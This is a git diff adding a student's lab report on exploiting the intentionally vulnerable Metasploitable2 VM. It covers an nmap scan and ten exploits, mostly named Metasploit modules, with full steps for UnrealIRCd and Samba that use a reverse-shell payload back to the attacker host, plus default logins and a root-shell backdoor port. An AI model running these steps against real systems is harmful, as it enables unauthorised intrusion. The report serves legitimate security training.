@@ -1,0 +1,79 @@
+# Penetration Testing Report - Metasploitable2
+**Student:** Lennox Kwarteng
+**Track:** Metasploitable2
+**Victim IP:** 192.168.1.4
+**Attacker IP (Kali):** 192.168.1.5
+**Date:** 2026-09-22
+**Repo:** via-internship-2026
+
+## Executive Summary
+This lab documents 10 successful exploits against Metasploitable2 using Kali Linux.
+
+## Phase 1: Scanning
+Command used: nmap -sV -p- 192.168.1.4 -oN 
+nmapn_scan.txt 
+Found open services: 21/ftp vsftpd 2.3.4, 22/ssh, 23/telnet, 25/smtp, 53/dns, 80/http, 445/samba, 6667/unrealircd, 1099/rmi, 3632/distccd, 5900/vnc, 8180/tomcat
+
+### Exploit 1: UnrealIRCd 3.2.8.1 Backdoor (Port 6667) - DONE ✅
+- **Tool:** Metasploit `exploit/unix/irc/unreal_ircd_3281_backdoor`
+- **Why:** Nmap found UnrealIRCd 3.2.8.1 which has a deliberate backdoor. Metasploit triggers it.
+- **Steps:**
+```bash
+use exploit/unix/irc/unreal_ircd_3281_backdoor
+set RHOSTS 192.168.1.4
+set LHOST 192.168.1.5
+set PAYLOAD cmd/unix/reverse
+exploit
+whoami
+Kill Chain; Exploitatio> Command and comtrol
+Proof (exploit1) 
+Exploit 2: Samba usermap_script (Port 445)
+- *Tool:* Metasploit `exploit/multi/samba/usermap_script`
+- *Why:* Samba 3.0.20 has command injection in username map script.
+- *Steps:*
+
+use exploit/multi/samba/usermap_script
+set RHOSTS 192.168.1.4
+set LHOST 192.168.1.5
+exploit
+whoami
+
+- *Kill Chain:* Exploitation -> Installation -> Privilege Escalation
+- *Proof:*
+![Exploit 2]
+
+Exploit 3: vsftpd 2.3.4 Backdoor (Port 21)
+- *Tool:* Metasploit `exploit/unix/ftp/vsftpd_234_backdoor`
+- *Steps:* same as above with RHOSTS 192.168.1.4
+- *Proof:* ![Exploit 3]
+
+Exploit 4: Java RMI Registry (Port 1099)
+- *Tool:* `exploit/multi/misc/java_rmi_server`
+- *Proof:* ![Exploit 4]
+
+Exploit 5: DistCC Daemon (Port 3632)
+- *Tool:* `exploit/unix/misc/distcc_exec`
+- *Proof:* ![Exploit 5]
+
+Exploit 6: VNC with password 'password' (Port 5900)
+- *Tool:* `nmap --script vnc-brute` + `vncviewer`
+- *Proof:* ![Exploit 6]
+
+Exploit 7: PostgreSQL Weak Password (Port 5432)
+- *Tool:* `msf auxiliary/scanner/postgres/postgres_login` then `postgres_payload`
+- *Proof:* ![Exploit 7]
+
+Exploit 8: Tomcat Manager (Port 8180) - tomcat:tomcat
+- *Tool:* `exploit/multi/http/tomcat_mgr_upload`
+- *Proof:* ![Exploit 8]
+
+Exploit 9: Telnet (Port 23) - msfadmin:msfadmin
+- *Tool:* `telnet 192.168.1.4` login msfadmin:msfadmin
+- *Proof:* ![Exploit 9)
+
+Exploit 10: Ingreslock Backdoor (Port 1524)
+- *Tool:* `telnet 192.168.1.4 1524` gives root shell directly
+- *Proof:* ![Exploit 10]
+
+Lessons Learned
+Metasploitable2 shows how outdated services and weak passwords lead to full compromise. Patching and disabling unnecessary services is critical.
